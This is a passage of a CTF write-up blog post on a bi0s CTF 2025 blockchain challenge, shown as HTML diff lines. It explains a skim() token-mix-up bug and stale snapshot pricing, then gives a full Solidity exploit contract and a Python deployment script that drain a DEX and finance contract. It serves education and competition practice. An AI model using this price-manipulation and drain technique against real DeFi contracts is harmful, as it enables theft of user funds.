+    <span class="k">function</span> <span class="n">getPrice</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">_wethPrice</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_inrPrice</span><span class="p">){</span>
+        <span class="kt">uint256</span> <span class="n">time_Elapsed</span><span class="o">=</span><span class="n">timeElapsed</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">lastSnapshotTime</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_SnapShot_Not_Yet_Taken</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">time_Elapsed</span><span class="o">&gt;=</span> <span class="mi">2</span> <span class="kc">minutes</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_Price_Is_Expired</span><span class="p">();</span>
+        <span class="p">}</span>
+        
+        <span class="p">(</span><span class="kt">uint256</span> <span class="n">_price0</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_price1</span><span class="p">,)</span><span class="o">=</span><span class="n">dex</span><span class="p">.</span><span class="n">get_Cumulative_Prices</span><span class="p">();</span>
+        
+        <span class="kt">uint256</span> <span class="n">_timeElapsed</span><span class="o">=</span> <span class="n">dex</span><span class="p">.</span><span class="n">timeStampLast</span><span class="p">()</span><span class="o">-</span><span class="n">lastSnapshotTime</span><span class="p">;</span>
+        
+        <span class="k">if</span><span class="p">(</span><span class="n">_timeElapsed</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_Prices_Not_Update_Since_Last_SnapShot</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">_wethPrice</span><span class="o">=</span> <span class="p">(</span><span class="n">_price0</span><span class="o">-</span><span class="n">wethPriceCumulative</span><span class="p">)</span><span class="o">/</span><span class="n">_timeElapsed</span><span class="p">;</span>
+        <span class="n">_inrPrice</span><span class="o">=</span> <span class="p">(</span><span class="n">_price1</span><span class="o">-</span><span class="n">inrPriceCumulative</span><span class="p">)</span><span class="o">/</span><span class="n">_timeElapsed</span><span class="p">;</span> 
+    <span class="p">}</span>
+</pre></table></code></div></div><p>To get price with <code class="language-plaintext highlighter-rouge">getPrice</code> function, the <code class="language-plaintext highlighter-rouge">snapshot</code> should be called at intervals between one and two minutes.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">_update</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span>
+        <span class="n">reserve0</span><span class="o">=</span><span class="kt">uint112</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+        <span class="n">reserve1</span><span class="o">=</span><span class="kt">uint112</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+        <span class="kt">uint256</span> <span class="n">timeElapsed</span><span class="o">=</span><span class="n">block</span><span class="p">.</span><span class="n">timestamp</span><span class="o">-</span><span class="n">timeStampLast</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">timeElapsed</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">reserve0</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">reserve1</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
+            <span class="n">price0CumulativeLast</span><span class="o">+=</span><span class="kt">uint256</span><span class="p">(</span><span class="n">UQ112x112</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">reserve1</span><span class="p">).</span><span class="n">uqdiv</span><span class="p">(</span><span class="n">reserve0</span><span class="p">)</span><span class="o">*</span><span class="n">timeElapsed</span><span class="p">);</span>
+            <span class="n">price1CumulativeLast</span><span class="o">+=</span><span class="kt">uint256</span><span class="p">(</span><span class="n">UQ112x112</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">reserve0</span><span class="p">).</span><span class="n">uqdiv</span><span class="p">(</span><span class="n">reserve1</span><span class="p">)</span><span class="o">*</span><span class="n">timeElapsed</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">timeStampLast</span><span class="o">=</span><span class="n">block</span><span class="p">.</span><span class="n">timestamp</span><span class="p">;</span>
+
+    <span class="p">}</span>
+</pre></table></code></div></div><p>In Dex contract, the price is calculated with current reserves of the tokens, similar to uniswap v2.</p><h3 id="the-bug-1">The bug<a href="#the-bug-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">skim</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">external</span>  <span class="p">{</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span><span class="o">-</span><span class="n">reserve0</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span><span class="o">-</span><span class="n">reserve1</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>The vulnerability is on <code class="language-plaintext highlighter-rouge">skim</code> function, It transfers <code class="language-plaintext highlighter-rouge">token0</code> with <code class="language-plaintext highlighter-rouge">token1</code> diff, not <code class="language-plaintext highlighter-rouge">token1</code>. The initial price is set to <code class="language-plaintext highlighter-rouge">1WETH = 230000INR</code> buts the user can swap 1 INR to 1 WETH. well, this is unintended bug. The fundamental bug is that <code class="language-plaintext highlighter-rouge">getPrice</code> function does not reflect the price after swap without manual <code class="language-plaintext highlighter-rouge">snapshot</code> call.</p><h3 id="drain-the-contract">Drain the contract<a href="#drain-the-contract" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>Now we can drain all WETH in DEX contarct. But we should get some balances before</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">claimBonus1</span><span class="p">()</span><span class="k">external</span><span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">claimed1</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Bonus_Already_Claimed</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">claimed1</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">userBonus1</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span> <span class="c1">// 12500 ether
+</span>    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">claimBonus2</span><span class="p">()</span><span class="k">external</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">claimed2</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Bonus_Already_Claimed</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">finance</span><span class="p">.</span><span class="n">entered</span><span class="p">()){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Bonus_Cannot_Be_Claimed_During_Flash_Loan</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)</span> <span class="o">&lt;</span><span class="mi">50</span><span class="n">_000</span> <span class="kc">ether</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Inelgible_For_Bonus_Claim</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">claimed2</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">userBonus2</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span> <span class="c1">// 10000 ether
+</span>    <span class="p">}</span>
+</pre></table></code></div></div><p>In Setup contract, it provides 12500 ether first and then when we have over 50000 WETH, it sends additional 10000 ether.</p><h3 id="exploit-2">Exploit<a href="#exploit-2" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><ol><li>Claim the initial WETH bonus and stake all received WETH to convert it to INR.<li>Withdraw all WETH from the DEX at a 1:1 INR:WETH ratio.<li>Claim the second Ether bonus after reaching the required WETH balance.<li>Transfer 1 WETH to the DEX to manipulate the swap rate.<li>Swap 1e18 WETH for INR at the manipulated rate, then withdraw most of the INR from the DEX.<li>Send the same amount of INR back to the DEX and transfer 10,000e18 WETH to set the swap rate to 1:10,000.<li>With the manipulated swap rate, withdraw all WETH from the finance contract using some INR, and then withdraw WETH from the DEX again to further increase the WETH price.<li>Withdraw all INR from the finance contract at the manipulated rate, then send INR and WETH to the DEX to restore the initial LP amounts.</ol><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">Exploit</span> <span class="p">{</span>
+    <span class="n">Setup</span> <span class="n">setup</span><span class="p">;</span>
+    <span class="n">DEX</span> <span class="n">dex</span><span class="p">;</span>
+    <span class="n">Finance</span> <span class="n">finance</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="n">WETH</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="n">INR</span><span class="p">;</span>
+
+    <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="n">Setup</span> <span class="n">_setup</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">setup</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">;</span>
+        <span class="n">dex</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">dex</span><span class="p">();</span>
+        <span class="n">finance</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">finance</span><span class="p">();</span>
+        <span class="n">WETH</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">WETH</span><span class="p">();</span>
+        <span class="n">INR</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">INR</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">stage1</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="n">setup</span><span class="p">.</span><span class="n">claimBonus1</span><span class="p">();</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">stake</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">}(</span><span class="n">WETH</span><span class="p">);</span>
+        
+        <span class="c1">// 1. withdraw all WETH from dex
+</span>        <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">WETH</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">)));</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">skim</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        
+        <span class="c1">// 2. claim bonus2
+</span>        <span class="n">setup</span><span class="p">.</span><span class="n">claimBonus2</span><span class="p">();</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">stage2</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="c1">// 3. set swap rate 10000:1
+</span>        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="mi">1e18</span><span class="p">);</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">WETH</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="kt">uint256</span> <span class="n">gap</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">))</span> <span class="o">-</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">));</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="n">gap</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="mi">10000e18</span><span class="p">);</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">stage3</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="c1">// 4. withdraw ETH from finance
+</span>        <span class="n">finance</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">finance</span><span class="p">),</span> <span class="mi">262473</span><span class="o">*</span><span class="mi">1e14</span><span class="p">);</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">INR</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="mi">10000e18</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span> <span class="o">-</span> <span class="mi">1e11</span><span class="p">));</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">skim</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">stage4</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="c1">// 5. withdraw INR from finance
+</span>        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">stake</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mf">1.1</span> <span class="kc">ether</span><span class="p">}(</span><span class="n">INR</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="n">setup</span><span class="p">.</span><span class="n">WETH_SUPPLIED_BY_LP</span><span class="p">());</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">dex</span><span class="p">),</span> <span class="n">setup</span><span class="p">.</span><span class="n">INR_SUPPLIED_BY_LP</span><span class="p">());</span>
+        <span class="n">dex</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+        <span class="n">finance</span><span class="p">.</span><span class="n">stake</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">100</span><span class="n">_000</span> <span class="kc">ether</span> <span class="o">-</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))}(</span><span class="n">WETH</span><span class="p">);</span>
+        <span class="n">setup</span><span class="p">.</span><span class="n">solve</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre><span class="c1">## [...]
+</span><span class="n">setup_addr</span> <span class="o">=</span> <span class="s">"0x33f2D286C37bA672562cA96A97e9047C93a10002"</span>
+<span class="n">pv_key</span> <span class="o">=</span> <span class="s">"0x9f177531d167891c3ade8a6b754393750350f941da78feaaeecf1d678dd14891"</span>
+<span class="n">rpc_url</span> <span class="o">=</span> <span class="s">"http://rpc.eng.run:8372"</span>
+<span class="n">env</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">copy</span><span class="p">()</span>
+<span class="n">env</span><span class="p">.</span><span class="n">update</span><span class="p">({</span>
+    <span class="s">"SETUP"</span><span class="p">:</span> <span class="n">setup_addr</span>
+<span class="p">})</span>
+
+<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">create</span><span class="p">(</span><span class="n">setup_addr</span><span class="p">,</span> <span class="n">pv_key</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
+<span class="n">exploit_addr</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"Deployed to: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Exploit contract deployed to </span><span class="si">{</span><span class="n">exploit_addr</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Stage 1"</span><span class="p">)</span>
+<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">cast_send</span><span class="p">(</span><span class="n">exploit_addr</span><span class="p">,</span> <span class="s">"stage1()"</span><span class="p">,</span> <span class="n">pv_key</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Stage 2"</span><span class="p">)</span>
+<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">cast_send</span><span class="p">(</span><span class="n">exploit_addr</span><span class="p">,</span> <span class="s">"stage2()"</span><span class="p">,</span> <span class="n">pv_key</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Stage 3"</span><span class="p">)</span>
+<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">cast_send</span><span class="p">(</span><span class="n">exploit_addr</span><span class="p">,</span> <span class="s">"stage3()"</span><span class="p">,</span> <span class="n">pv_key</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Stage 4"</span><span class="p">)</span>
+<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">cast_send</span><span class="p">(</span><span class="n">exploit_addr</span><span class="p">,</span> <span class="s">"stage4()"</span><span class="p">,</span> <span class="n">pv_key</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
+<span class="c1">## [...]
+</span></pre></table></code></div></div><p>Thanks for reading ! I’d like to make this kind of fun challenge next time :D</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web3/'>WEB3</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/web3/" class="post-tag no-text-decoration" >web3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) bi0s CTF 2025 writeup (blockchains) - snwo&url=http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) bi0s CTF 2025 writeup (blockchains) - snwo&u=http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) bi0s CTF 2025 writeup (blockchains) - snwo&url=http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2024-realworldctf/"><div class="card-body"> <em class="timeago small" date="2024-01-30 17:02:13 +0900" >Jan 30, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) realworld CTF 2024 writeup (SafeBridge)</h3><div class="text-muted small"><p> web3 newbie’s solver for SafeBridge in rwctf 2024 Objective Drain the BRIDGE (L1ERC20Bridge) of its WETH balance. Setup The challenge setup is using the challenge.py file, with relayer.py also ...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-justCTF/"><div class="card-body"> <em class="timeago small" date="2024-06-16 17:02:13 +0900" >Jun 16, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) justCTF 2024 writeup (Blockchains)</h3><div class="text-muted small"><p> It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge ) The Otter Scrolls Al...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-SekaiCTF/"><div class="card-body"> <em class="timeago small" date="2024-08-27 05:02:13 +0900" >Aug 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SekaiCTF 2024 writeup (ZOO)</h3><div class="text-muted small"><p> I made solidity assembly challenge in sekai ctf 